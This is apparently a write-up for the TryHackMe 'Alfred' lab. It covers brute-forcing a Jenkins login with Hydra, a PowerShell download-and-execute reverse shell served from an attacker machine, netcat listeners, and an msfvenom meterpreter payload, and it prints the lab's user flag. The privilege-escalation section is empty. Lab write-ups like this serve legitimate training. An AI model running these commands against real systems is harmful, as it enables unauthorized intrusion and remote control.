# [Alfred - TryHackMe](https://tryhackme.com/room/alfred) | Cyanyde

Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

## Credits

- Created by [try hack me](https://tryhackme.com/p/tryhackme)
- Room type: premium

## Initial Access

### How many ports are open?

- Scan ports and versions with Nmap
    - `nmap -sV -sC -T5 <target ip> -oN jenkinsNmap`
        - **-sV** flag to scan service version
        - **-sC** flag to enable default script scan
        - **-T5** to set timing template to fastest (no rate limit in this room)
        - **-oN <filename>** to put normal output into file

> There are **3** TCP ports open

### What is the username and password for the login panel? (in the format username:password)

- The site hosted on port 8080 is a login page
- There is also a /robots.txt directory

```
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```

- Use Hydra to brute force the admin password for the portal
    - Use a proxy to find the format of the login page (Firefox or BurpSuite will work fine)
        - Format is j_username=^USER^&j_password=^PASS^
    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target ip> http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid" -s 8080`

> The username and password combination that is returned is **admin:admin**

### What is the user.txt flag?

- Find a way to execute code from inside the portal
    - Jenkins is a server that allows developers to build, test, and deploy their codebase
    - There is currently an existing project in the Jenkins portal named "project"
    - The project allows you to add Windows batch commands as part of the build instructions
- Set up a reverse shell to the machine
    - powershell iex (New-Object Net.WebClient).DownloadString('http://<attack machine ip>:<attack machine port 1>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attack machine ip> -Port <attack machine port 2>
    - Click *apply* and *save* after adding reverse shell command in Jenkins build instructions
    - Before building (and running the reverse shell) on the Jenkins server, set up listeners on attack machine - **Important note**: In the above, attack machine port 1 should be replaced by the port of the *HTTP Web Server* and attack machine port 2 should be replaced by the port of the *Netcat listener*
        - HTTP Server to host initial reverse shell script
            - Use this [script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) (options are already configured in the one-liner)
            - Navigate to the folder the script is downloaded to on the attack machine
            - `python3 -m http.server <port>` to serve everything in that folder (`python -m SimpleHTTPServer <attack machine port 1> for older Python versions)
        - Netcat Listener to receive reverse shell connection
            - `nc -lvnp <attack machine port 2>` to listen on the port set in the powershell one-liner (may need to use `ncat -lvnp <attack machine port 2>` for newer distros)
    - Build the "project" in Jenkins that will reach out to pull the reverse shell
- Once connected to machine, change to `C:\Users\` directory and fine the flag in *bruce*'s desktop folder

> <details><summary>The flag is </summary>79007a09481963edf2e1321abd9ae2a0</summary>

## Switching Shells

- Privilege escalation will be much easier with a meterpreter shell (hosted through metasploit)
- Generate meterpreter reverse shell
    - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<attack machine IP> LPORT=<attack machine port> -f exe -o hehe.exe` to generate reverse shell with meterpreter
    - **REMINDER**: The port must be different than the one used for the original reverse shell

> The shell generated should have a final size of **73802**

## Privilege Escalation

-
